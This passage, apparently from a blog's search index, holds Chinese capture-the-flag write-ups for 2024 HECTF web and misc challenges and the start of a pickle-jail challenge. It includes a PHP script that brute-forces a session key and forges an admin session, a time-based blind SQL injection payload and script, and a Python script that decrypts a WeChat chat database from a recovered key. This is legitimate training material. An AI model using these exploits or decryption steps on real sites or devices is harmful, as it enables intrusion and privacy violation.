session_decrypt($t,$key); } 官方exp\n\u0026lt;?php error_reporting(0); function session_encrypt($message, $key) { $method = \u0026#39;AES-256-CBC\u0026#39;; $iv_size = openssl_cipher_iv_length($method); $iv = openssl_random_pseudo_bytes($iv_size); $enc = openssl_encrypt($message, $method, $key, OPENSSL_RAW_DATA, $iv); return base64_encode($iv . $enc); } function session_decrypt($session, $key) { $data = base64_decode($session); $method = \u0026#39;AES-256-CBC\u0026#39;; $iv_size = openssl_cipher_iv_length($method); $iv = substr($data, 0, $iv_size); $enc = substr($data, $iv_size); return openssl_decrypt($enc, $method, $key, OPENSSL_RAW_DATA, $iv); } $token = urldecode(\u0026#34;token\u0026#34;); for ($i = 1e5; $i \u0026lt;= 1e7; $i++) { mt_srand($i); $key = rand(); if (strpos(session_decrypt($token, $key), \u0026#34;guest\u0026#34;) !== false) { echo \u0026#34;Find it: \u0026#34; . $key; var_dump(session_decrypt($token, $key)); break; } } var_dump(session_encrypt(\u0026#39;O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:4:\u0026#34;role\u0026#34;;s:5:\u0026#34;admin\u0026#34;;}\u0026#39;, $key)); ezjava# 还有一道java题，由于javaweb很生疏，所以这个就留到不久的将来复现吧\n至此\n2024HECTF的篇章差不多要翻页了！✌️\n🥳🥳🥳\n真的学无♾️📖📖📖\u0026hellip;\n","date":"2024-12-16","id":4,"permalink":"/blog/2024hectfweb/","summary":"2024HECTFweb# babysql# 直接万能密码过\n进入查询后台\n测试发现是盲注，可以使用布尔盲注，这里采用时间盲注\n接下来就是脚本\n首先跑一个fuzz字典看有哪儿些东西被过滤了\n可以看到有些重要的东西也被过滤了，像空格,information_schema\n测试\nfrom requests import post base_url = \u0026#39;xxx/worker.php\u0026#39; payload = \u0026#34;1\u0026#39;/**/or/**/if((select/**/database())like/**/database(),sleep(3),0)#\u0026#34; data = {\u0026#34;name\u0026#34;:payload} def check_time(data): try: res=post(base_url, data=data,timeout=2) #如果没有超时说明失败了 return \u0026#34;failure\u0026#34; except: return \u0026#34;success\u0026#34; print(check_time(data)) ","tags":["Blog","CTF-Web"],"title":"2024HECTFweb"},{"content":"2024HECTFmisc# 恶势力的聊天记录# vol3参考文档\nVolatility 3 — Volatility 3 2.11.0 documentation\nvol3使用参考\nVolatility3内存取证工具使用详解-CSDN博客\nvol2命令格式： volatility -f [image] --profile=[profile] [plugin] 这里需要注意 ：Volatility3和Volatility2用法差不多，但不需要指定profile ，只是插件调用方式改变，特定的操作系统有特定的插件 python3 vol.py [plugin] -f [image]\r常用插件：\rlayerwriter：列出内存镜像platform信息\rlinux.bash：从内存中恢复bash命令历史记录\rlinux.check_afinfo：验证网络协议的操作功能指针\rlinux.check_syscall：检查系统调用表中的挂钩\rlinux.elfs：列出所有进程的所有内存映射ELF文件\rlinux.lsmod：列出加载的内核模块\rlinux.lsof：列出所有进程的所有内存映射\rlinux.malfind：列出可能包含注入代码的进程内存范围\rlinux.proc：列出所有进程的所有内存映射\rlinux.pslist：列出linux内存映像中存在的进程\rlinux.pstree：列出进程树\rmac.bash：从内存中恢复bash命令历史记录\rmac.check_syscall：检查系统调用表中的挂钩\rmac.check_sysctl：检查sysctl处理程序的挂钩\rmac.check_trap_table：检查trap表中的挂钩\rmac.ifconfig：列出网卡信息\rmac.lsmod：列出加载的内核模块\rmac.lsof：列出所有进程的所有内存映射\rmac.malfind：列出可能包含注入代码的进程内存范围\rmac.netstat：列出所有进程的所有网络连接\rmac.psaux：恢复程序命令行参数\rmac.pslist：列出linux内存映像中存在的进程\rmac.pstree：列出进程树\rmac.tasks：列出Mac内存映像中存在的进程\rwindows.info：显示正在分析的内存样本的OS和内核详细信息\rwindows.callbacks：列出内核回调和通知例程\rwindows.cmdline：列出进程命令行参数\rwindows.dlldump：将进程内存范围DLL转储\rwindows.dlllist：列出Windows内存映像中已加载的dll模块\rwindows.driverirp：在Windows内存映像中列出驱动程序的IRP\rwindows.driverscan：扫描Windows内存映像中存在的驱动程序\rwindows.filescan：扫描Windows内存映像中存在的文件对象\rwindows.handles：列出进程打开的句柄\rwindows.malfind：列出可能包含注入代码的进程内存范围\rwindows.moddump：转储内核模块\rwindows.modscan：扫描Windows内存映像中存在的模块\rwindows.mutantscan：扫描Windows内存映像中存在的互斥锁\rwindows.pslist：列出Windows内存映像中存在的进程\rwindows.psscan：扫描Windows内存映像中存在的进程\rwindows.pstree：列出进程树\rwindows.procdump：转储处理可执行映像\rwindows.registry.certificates：列出注册表中存储的证书\rwindows.registry.hivelist：列出内存映像中存在的注册表配置单元\rwindows.registry.hivescan：扫描Windows内存映像中存在的注册表配置单元\rwindows.registry.printkey：在配置单元或特定键值下列出注册表项\rwindows.registry.userassist：打印用户助手注册表项和信息\rwindows.ssdt：列出系统调用表\rwindows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程\rwindows.svcscan：扫描Windows服务\rwindows.symlinkscan：扫描Windows内存映像中存在的链接 ──(root㉿kali)-[/home/messi/Desktop/vol3]\r└─# sudo ln -s /home/messi/Desktop/vol3/vol.py /usr/local/bin/vol3\r//添加一个软连接方便使用 列出所有进程\nvol3 -f image.vmem windows.pslist.PsList vol3 -f image.vmem windows.pslist.PsList 每个部分都有特定的含义和功能。我将逐个解释这些部分：\r-f image.vmem: -f 参数指定了内存镜像文件的位置。在这个例子中，image.vmem 是你想要分析的 Windows 内存转储文件的路径。VMEM 文件通常是 VMware 虚拟机的内存快照。\rwindows.pslist.PsList: 这部分指定了要运行的插件。Volatility 的插件结构通常遵循以下格式：\u0026lt;操作系统\u0026gt;.\u0026lt;类别\u0026gt;.\u0026lt;插件名称\u0026gt;。在这里，我们有：\rwindows: 表示这个插件适用于 Windows 操作系统的内存分析。Volatility 支持多种操作系统（如 Linux 和 macOS），每个操作系统都有自己的一套插件。\rpslist: 插件所属的类别，通常表示该插件提供的功能类型。例如，pslist 类别下的插件用于列出进程信息。\rPsList: 这是具体要执行的插件名称。PsList 插件用来从内存镜像中提取正在运行的进程列表。它会显示进程 ID (PID)、父进程 ID (PPID)、创建时间和映像路径等信息。\r关于 windows. 后面可以跟哪些内容，这取决于你想要进行什么样的分析。以下是几个常见的插件类别及其作用：\rpslist: 列出系统中的所有进程。\rmodules: 显示加载到内存中的模块（DLLs）。\rhandles: 展示进程句柄，包括文件、注册表键和其他资源。\rcmdline: 提取进程的命令行参数。\rnetscan: 扫描网络连接和端口。\rdlllist: 列出每个进程中加载的动态链接库。\rprivileges: 查看进程所拥有的特权。\rmalfind: 寻找可能的恶意代码，比如隐藏的或注入的代码。\rsvcscan: 扫描并显示服务控制管理器数据库中的服务。 --info 参数来获取更多可用插件的信息\nvol3 --info | grep windows. 发现后台WeChat进程，使用filescan过滤wxid查找微信文件\nvol3 -f image.vmem windows.filescan.FileScan | grep \u0026#34;wxid\u0026#34; 找到微信用户wxid为wxid_ah0tuevc7rbz22\n导出微信聊天记录数据库文件\nvol3 -f image.vmem windows.filescan.FileScan | grep \u0026#34;wxid_ah0tuevc7rbz22.*Msg.*Multi.*db\u0026#34; \u0026gt; filedb.txt MSG.db为存储聊天记录的数据库，导出数据库MSG0.db\n┌──(root㉿kali)-[/home/messi/Desktop/vol3]\r└─# cat filedb.txt 0x247c7b90 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\MultiSearchChatMsg.db\r0x7da66710 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db\r0x7db98970 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db-shm\r0x7dc9eac0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db\r0x7dcb8b20 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\bak\\MSG0_1731071567.bakdb-wal\r0x7dcbc7a0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db-shm\r0x7dcbcdd0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\bak\\MSG0_1731071567.bakdb-shm\r0x7dcf18c0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\MultiSearchChatMsg.db-wal\r0x7dcf1f20 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db-wal\r0x7e0dd8d0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\FTSMSG0.db\r0x7f319780 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\MultiSearchChatMsg.db-shm\r0x7fa8bbc0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MediaMSG0.db-shm\r0x7fa8bf20 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MediaMSG0.db-wal\r0x7fb85d40 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\FTSMSG0.db-shm\r0x7fca2a10 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MSG0.db-wal\r0x7fcb8bc0 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\MediaMSG0.db\r0x7fccff20 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\MultiSearchChatMsg.db\r0x7fd40360 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\FTSMSG0.db-wal\r0x7fdb4d10 \\Users\\aja\\Documents\\WeChat Files\\wxid_ah0tuevc7rbz22\\Msg\\Multi\\FTSMSG0.db 下载系统中的文件# 【volatality 3】使用说明文档_volatility3-CSDN博客\n这个插件和2.6中的差异较大, 在3.0的版本中,已经找不到 memdump procdump等插件了\r只有一个dumpfiles 我们可以通过-h 来查看下参数 在3.0的版本中一定要指定物理地址进行下载\r可以发现，不仅可以通过虚拟地址还可以通过PID、物理地址进行下载文件. 也不再通过-D 指定保存的路径 ┌──(root㉿kali)-[/home/messi/Desktop/vol3]\r└─# vol3 -f image.vmem windows.dumpfiles.DumpFiles -h Volatility 3 Framework 2.12.0\rusage: vol3 windows.dumpfiles.DumpFiles [-h] [--pid PID] [--virtaddr VIRTADDR] [--physaddr PHYSADDR] [--filter FILTER] [--ignore-case]\rDumps cached file contents from Windows memory samples.\roptions:\r-h, --help show this help message and exit\r--pid PID Process ID to include (all other processes are excluded)\r--virtaddr VIRTADDR Dump a single _FILE_OBJECT at this virtual address\r--physaddr PHYSADDR Dump a single _FILE_OBJECT at this physical address\r--filter FILTER Dump files matching regular expression FILTER\r--ignore-case Ignore case in filter match 在 Volatility 3 中，如果你想将转储的文件保存到特定目录，可以直接在命令中指定文件名，而无需使用 -o 参数。以下是更新后的命令：\npython3 vol.py -f image.vmem windows.dumpfiles.DumpFiles --virtaddr 0x000000007da66710 输出文件的处理# 如果你想将输出文件重定向到某个文件，可以在命令行中使用输出重定向符号（\u0026gt;）来实现。比如：\npython3 vol.py -f image.vmem windows.dumpfiles.DumpFiles --virtaddr 0x000000007da66710 \u0026gt; output.txt dump下MSG.db为存储聊天记录的数据库，导出数据库MSG0.db\n┌──(root㉿kali)-[/home/messi/Desktop/vol3]\r└─# vol3 -f image.vmem windows.dumpfiles.DumpFiles --virtaddr 0x7da66710\rVolatility 3 Framework 2.12.0\rWARNING volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. image.vmem and image.vmss.\rProgress: 100.00 PDB scanning finished Cache FileObject FileName Result 不知道什么原因vol3就是没有转储下来 后续操作就参考其他师傅的wp，用的是vol2\n微信数据库是加密的，需要找到密钥才能解密，filescan找到Desktop存在secretkey.zip\n0x000000007e1b7660 5 0 RW---- \\Device\\HarddiskVolume2\\Users\\aja\\Desktop\\secretkey.zip 导出解压后，为64个文件，每个文件内容都是一段md5\n批量进行MD5破解，拼接在一起即为64位的微信密钥\n55e0ab1f18cd42d38e55eeec60f8911a4d22b13f0a154645b6bdc8b41766a58a 使用脚本进行数据库解密\n# -*- coding: utf-8 -*- from Crypto.Cipher import AES import hashlib, hmac, ctypes SQLITE_FILE_HEADER = bytes(\u0026#34;SQLite format 3\u0026#34;, encoding=\u0026#39;ASCII\u0026#39;) + bytes(1) IV_SIZE = 16 HMAC_SHA1_SIZE = 20 KEY_SIZE = 32 DEFAULT_PAGESIZE = 4096 # 4048数据 + 16IV + 20 HMAC + 12 DEFAULT_ITER = 64000 # yourkey password = bytes.fromhex(\u0026#34;55e0ab1f18cd42d38e55eeec60f8911a4d22b13f0a154645b6bdc8b41766a58a\u0026#34;.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;)) with open(r\u0026#39;MSG0.db\u0026#39;, \u0026#39;rb\u0026#39;) as f: blist = f.read() print(len(blist)) salt = blist[:16] key = hashlib.pbkdf2_hmac(\u0026#39;sha1\u0026#39;, password, salt, DEFAULT_ITER, KEY_SIZE) first = blist[16:DEFAULT_PAGESIZE] # import struct mac_salt = bytes([x ^ 0x3a for x in salt]) mac_key = hashlib.pbkdf2_hmac(\u0026#39;sha1\u0026#39;, key, mac_salt, 2, KEY_SIZE) hash_mac = hmac.new(mac_key, digestmod=\u0026#39;sha1\u0026#39;) hash_mac.update(first[:-32]) hash_mac.update(bytes(ctypes.c_int(1))) # hash_mac.update(struct.pack(\u0026#39;=I\u0026#39;,1)) if (hash_mac.digest() == first[-32:-12]): print(\u0026#39;Correct Password\u0026#39;) else: raise RuntimeError(\u0026#39;Wrong Password\u0026#39;) blist = [blist[i:i + DEFAULT_PAGESIZE] for i in range(DEFAULT_PAGESIZE, len(blist), DEFAULT_PAGESIZE)] with open(r\u0026#39;3.db\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(SQLITE_FILE_HEADER) t = AES.new(key, AES.MODE_CBC, first[-48:-32]) f.write(t.decrypt(first[:-48])) f.write(first[-48:]) for i in blist: t = AES.new(key, AES.MODE_CBC, i[-48:-32]) f.write(t.decrypt(i[:-48])) f.write(i[-48:]) 查看解密后文件\n发现一段百度网盘的连接https://pan.baidu.com/s/17Bt-vSpRpBLRuhTWaCgb6g?pwd=mfpt 提取\n码: mfpt，百度网盘下载\n下载压缩包并解压，为文本文件，是一段很长的hex数据和key\nRC4解密\nBase64解密结果为图片的MD5，使用网站解码https://tool.jisuapi.com/base642pic.html\nHXD打开，文件尾部有PK头，并有hectf_[4number].zip的提示\n最后就是根据提示用ARCHPR进行掩码爆破\n密码hectf_7865\n简单的压缩包# 根据正则表达式⽣成字典爆破密码\nimport itertools import string # 定义字符集 lowercase_letters = string.ascii_lowercase # 小写字母 a-z digits = string.digits # 数字 0-9 non_lowercase = \u0026#39;\u0026#39;.join(set(string.printable[:-6]) - set(lowercase_letters)) # 非小写字母 non_digits = \u0026#39;\u0026#39;.join(set(string.printable[:-6]) - set(digits)) # 非数字字符 # 生成符合正则表达式的密码并保存到文件 def generate_password_dict(filename): with open(filename, \u0026#39;w\u0026#39;) as f: for letter1, letter2 in itertools.product(lowercase_letters, repeat=2): for digit in digits: for char in non_lowercase: for last_char in non_digits: password = f\u0026#34;{letter1}{letter2}{digit}{char}{last_char}\u0026#34; f.write(password + \u0026#39;\\n\u0026#39;) # print(f\u0026#34;Generated: {password}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: output_filename = \u0026#34;generated_passwords.txt\u0026#34; # print(f\u0026#34;Generating passwords and saving to {output_filename}...\u0026#34;) generate_password_dict(output_filename) # print(\u0026#34;Password generation complete.\u0026#34;) 爆破后得到密码：np76_\n解压后binwalk直接扫，得到zip.zip\n读getzip.py可以得到AES的key和iv之后直接解密即可拿到flag\n恶势力的仓库# 打开流量包，查看http流量\n很明显有login流量，然后追踪tcp流，发现这里有个data传的值为\n{\u0026ldquo;data\u0026rdquo;:{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;hue=8zZvR2YzlWb\u0026rdquo;,\u0026ldquo;password\u0026rdquo;:\u0026ldquo;YI6=ECZvd2YzlWb\u0026rdquo;}}\n一看就是被处理过的\nlogin位置，向前找登录的逻辑\n有js文件，看了一下居多，没看到什么敏感信息\n在刚刚login基础上往下看一个流\n找到一些有用的东西\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-cn\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;jquery-3.5.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row justify-content-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mt-5\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;text-center\u0026#34;\u0026gt;..................\u0026lt;/h3\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;Username\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; class=\u0026#34;form-control\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary btn-block\u0026#34;\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;loginStatus\u0026#34; class=\u0026#34;mt-3 text-center\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; eval(atob(\u0026#39;ZnVuY3Rpb24gYmFzZTY0X2VuY29kZShzdHIpe3JldHVybiBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChzdHIpKSl9ZnVuY3Rpb24gYWRkUmFuZG9tQ2hhcnMoc3RyKXtjb25zdCBjaGFycz0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiO2xldCByYW5kb21DaGFycz0iIjtmb3IobGV0IGk9MDtpPDM7aSsrKXtyYW5kb21DaGFycys9Y2hhcnMuY2hhckF0KE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpjaGFycy5sZW5ndGgpKX1yZXR1cm4gcmFuZG9tQ2hhcnMrc3RyfWZ1bmN0aW9uIHJldmVyc2VTdHJpbmcoc3RyKXtyZXR1cm4gc3RyLnNwbGl0KCIiKS5yZXZlcnNlKCkuam9pbigiIil9JCgiI2xvZ2luRm9ybSIpLm9uKCJzdWJtaXQiLGZ1bmN0aW9uKGUpe2UucHJldmVudERlZmF1bHQoKTt2YXIgdXNlcm5hbWU9JCgiI3VzZXJuYW1lIikudmFsKCk7dmFyIHBhc3N3b3JkPSQoIiNwYXNzd29yZCIpLnZhbCgpO3ZhciBlbmNvZGVkVXNlcm5hbWU9YWRkUmFuZG9tQ2hhcnMocmV2ZXJzZVN0cmluZyhiYXNlNjRfZW5jb2RlKHVzZXJuYW1lKSkpO3ZhciBlbmNvZGVkUGFzc3dvcmQ9YWRkUmFuZG9tQ2hhcnMocmV2ZXJzZVN0cmluZyhiYXNlNjRfZW5jb2RlKHBhc3N3b3JkKSkpO3ZhciBkYXRhPXtkYXRhOnt1c2VybmFtZTplbmNvZGVkVXNlcm5hbWUscGFzc3dvcmQ6ZW5jb2RlZFBhc3N3b3JkfX07JC5hamF4KHt1cmw6ImxvZ2luLnBocCIsdHlwZToiUE9TVCIsY29udGVudFR5cGU6ImFwcGxpY2F0aW9uL2pzb24iLGRhdGFUeXBlOiJqc29uIixkYXRhOkpTT04uc3RyaW5naWZ5KGRhdGEpLHN1Y2Nlc3M6ZnVuY3Rpb24ocmVzcG9uc2Upe2lmKHJlc3BvbnNlLnN1Y2Nlc3Mpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSJ3YXJlaG91c2UucGhwIn1lbHNleyQoIiNsb2dpblN0YXR1cyIpLmh0bWwoJzxzcGFuIGNsYXNzPSJ0ZXh0LWRhbmdlciI+TG9naW4gZmFpbGVkLCB0cnkgYWdhaW4hPC9zcGFuPicpfX0sZXJyb3I6ZnVuY3Rpb24oKXskKCIjbG9naW5TdGF0dXMiKS5odG1sKCc8c3BhbiBjbGFzcz0idGV4dC1kYW5nZXIiPkVycm9y44CCPC9zcGFuPicpfX0pfSk7\u0026#39;)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JavaScript 中，atob 函数用于解码使用 Base64 编码的字符串。 function base64_encode(str) { return btoa(unescape(encodeURIComponent(str))); } function addRandomChars(str) { const chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#34;; let randomChars = \u0026#34;\u0026#34;; for (let i = 0; i \u0026lt; 3; i++) { randomChars += chars.charAt(Math.floor(Math.random() * chars.length)); } return randomChars + str; } function reverseString(str) { return str.split(\u0026#34;\u0026#34;).reverse().join(\u0026#34;\u0026#34;); } $(\u0026#34;#loginForm\u0026#34;).on(\u0026#34;submit\u0026#34;, function(e) { e.preventDefault(); var username = $(\u0026#34;#username\u0026#34;).val(); var password = $(\u0026#34;#password\u0026#34;).val(); var encodedUsername = addRandomChars(reverseString(base64_encode(username))); var encodedPassword = addRandomChars(reverseString(base64_encode(password))); var data = { data: { username: encodedUsername, password: encodedPassword } }; $.ajax({ url: \u0026#34;login.php\u0026#34;, type: \u0026#34;POST\u0026#34;, contentType: \u0026#34;application/json\u0026#34;, dataType: \u0026#34;json\u0026#34;, data: JSON.stringify(data), success: function(response) { if (response.success) { window.location.href = \u0026#34;warehouse.php\u0026#34;; } else { $(\u0026#34;#loginStatus\u0026#34;).html(\u0026#39;\u0026lt;span class=\u0026#34;text-danger\u0026#34;\u0026gt;Login failed, try again!\u0026lt;/span\u0026gt;\u0026#39;); } }, error: function() { $(\u0026#34;#loginStatus\u0026#34;).html(\u0026#39;\u0026lt;span class=\u0026#34;text-danger\u0026#34;\u0026gt;Error。\u0026lt;/span\u0026gt;\u0026#39;); } }); }); 查看eval内base64编码的JavaScript，可看到，密码和用户名都是把\n明文base64编码后，倒置了一下，然后在字符串前加了三个随机字符\nYI6=ECZvd2YzlWb\n可以解出密码为 miscgod! ，这个也是后续压缩包密码\n流11上传了一句话木马\n流 17 18 19 为 蚁 剑 下 载 文 件 的 流 量 ， 下 载 的 文 件 为 机 密 文 件 .7z\nnothingnoflag.gif 破防小王.png 三个文件\n流16列目录，流17提取出gif图，流18提取出png图，结尾有base64字符串\n用之前的密码 miscgod! 解开7z压缩包，然后得到execl，execl中有0和1两种单元\n格，都是被隐藏的，将行列设置一样的大小，全选搜索所有1，涂黑后是二维码，扫\n码得到flag\nctrl+F 搜索所有的1，然后\n选择全部替换\n","date":"2024-12-13","id":5,"permalink":"/blog/2024hectfmisc/","summary":"2024HECTFmisc# 恶势力的聊天记录# vol3参考文档\nVolatility 3 — Volatility 3 2.11.0 documentation\nvol3使用参考\nVolatility3内存取证工具使用详解-CSDN博客\nvol2命令格式： volatility -f [image] --profile=[profile] [plugin] 这里需要注意 ：Volatility3和Volatility2用法差不多，但不需要指定profile ，只是插件调用方式改变，特定的操作系统有特定的插件 python3 vol.py [plugin] -f [image]\r常用插件：\rlayerwriter：列出内存镜像platform信息\rlinux.bash：从内存中恢复bash命令历史记录\rlinux.check_afinfo：验证网络协议的操作功能指针\rlinux.check_syscall：检查系统调用表中的挂钩\rlinux.elfs：列出所有进程的所有内存映射ELF文件\rlinux.lsmod：列出加载的内核模块\rlinux.lsof：列出所有进程的所有内存映射\rlinux.malfind：列出可能包含注入代码的进程内存范围\rlinux.proc：列出所有进程的所有内存映射\rlinux.pslist：列出linux内存映像中存在的进程\rlinux.pstree：列出进程树\rmac.bash：从内存中恢复bash命令历史记录\rmac.check_syscall：检查系统调用表中的挂钩\rmac.check_sysctl：检查sysctl处理程序的挂钩\rmac.check_trap_table：检查trap表中的挂钩\rmac.ifconfig：列出网卡信息\rmac.lsmod：列出加载的内核模块\rmac.lsof：列出所有进程的所有内存映射\rmac.malfind：列出可能包含注入代码的进程内存范围\rmac.netstat：列出所有进程的所有网络连接\rmac.psaux：恢复程序命令行参数\rmac.pslist：列出linux内存映像中存在的进程\rmac.pstree：列出进程树\rmac.tasks：列出Mac内存映像中存在的进程\rwindows.info：显示正在分析的内存样本的OS和内核详细信息\rwindows.callbacks：列出内核回调和通知例程\rwindows.cmdline：列出进程命令行参数\rwindows.dlldump：将进程内存范围DLL转储\rwindows.dlllist：列出Windows内存映像中已加载的dll模块\rwindows.driverirp：在Windows内存映像中列出驱动程序的IRP\rwindows.driverscan：扫描Windows内存映像中存在的驱动程序\rwindows.filescan：扫描Windows内存映像中存在的文件对象\rwindows.handles：列出进程打开的句柄\rwindows.malfind：列出可能包含注入代码的进程内存范围\rwindows.moddump：转储内核模块\rwindows.modscan：扫描Windows内存映像中存在的模块\rwindows.mutantscan：扫描Windows内存映像中存在的互斥锁\rwindows.pslist：列出Windows内存映像中存在的进程\rwindows.psscan：扫描Windows内存映像中存在的进程\rwindows.pstree：列出进程树\rwindows.procdump：转储处理可执行映像\rwindows.registry.certificates：列出注册表中存储的证书\rwindows.registry.hivelist：列出内存映像中存在的注册表配置单元\rwindows.registry.hivescan：扫描Windows内存映像中存在的注册表配置单元\rwindows.registry.printkey：在配置单元或特定键值下列出注册表项\rwindows.registry.userassist：打印用户助手注册表项和信息\rwindows.ssdt：列出系统调用表\rwindows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程\rwindows.svcscan：扫描Windows服务\rwindows.symlinkscan：扫描Windows内存映像中存在的链接 ──(root㉿kali)-[/home/messi/Desktop/vol3]\r└─# sudo ln -s /home/messi/Desktop/vol3/vol.py /usr/local/bin/vol3\r//添加一个软连接方便使用 列出所有进程\n","tags":["Blog","CTF-Misc"],"title":"2024HECTFmisc"},{"content":"2024强网杯-Misc-Pickle jail# 第一次遇到jail类型的题目，而且还是在大赛上，并且还是这么难的情况，努力理解复现吧。\n附件😣😰🥹：# pickle_jail.py 的文件\n#!/usr/local/bin/python from io import BytesIO from os import _exit from pathlib import Path from pickle import Pickler, Unpickler from sys import stderr, stdin, stdout from time import time from faker import Faker Faker.seed(time()) fake = Faker(\u0026#34;en_US\u0026#34;) flag = Path(\u0026#34;flag\u0026#34;).read_text() def print(_): stdout.buffer.write(f\u0026#34;{_}\\n\u0026#34;.encode()) stdout.buffer.flush() def input(_=None, limit: int = -1): if _: print(_) _ = stdin.buffer.readline(limit) stdin.buffer.flush() return _ def bye(_): print(_) _exit(0) players = [fake.unique.first_name().encode() for _ in range(50)] print(\u0026#34;Welcome to this jail game!\u0026#34;) print(f\u0026#34;Play this game to get the flag with these players: {players}!\u0026#34;) name = input(\u0026#34;So... What\u0026#39;s your name?\u0026#34;, 300).strip() assert name not in players, \u0026#34;You are already joined!\u0026#34; print(f\u0026#34;Welcome {name}!\u0026#34;) players.append(name) biox = BytesIO() Pickler(biox).dump( ( name, players, flag, ) ) data = bytearray(biox.getvalue()) num = input(\u0026#34;Enter a random number to win: \u0026#34;, 1)[0] assert num \u0026lt; len(data), \u0026#34;You are not allowed to win!\u0026#34; data[num] += 1 data[num] %= 0xFF del name, players, flag biox.close() stderr.close() try: safe_dic = { \u0026#34;__builtins__\u0026#34;: None, \u0026#34;n\u0026#34;: BytesIO(data), \u0026#34;F\u0026#34;: type(\u0026#34;f\u0026#34;, (Unpickler,), {\u0026#34;find_class\u0026#34;: lambda *_: \u0026#34;H4cker\u0026#34;}), } name, players, _ = eval(\u0026#34;F(n).load()\u0026#34;, safe_dic, {}) if name in players: del _ print(f\u0026#34;{name} joined this game, but here is no flag!\u0026#34;) except Exception: print(\u0026#34;What happened? IDK...\u0026#34;) finally: bye(\u0026#34;Break this jail to get the flag!\u0026#34;) 分析附件：# 一上来这个代码就给我看懵了，对于python基本功不是很扎实的我，没看懂逻辑，一边拿ai一边分析。\n记录几个点：\nsys.stdout 和 sys.stdout.buffer\ndef print(_): stdout.buffer.write(f\u0026#34;{_}\\n\u0026#34;.encode()) stdout.buffer.flush() sys.stdout 和 sys.stdout.buffer 提供了两种不同层次的接口来与标准输出（通常是终端或命令行界面）进行交互：\nsys.stdout (文本模式) 类型：这是一个文本文件对象 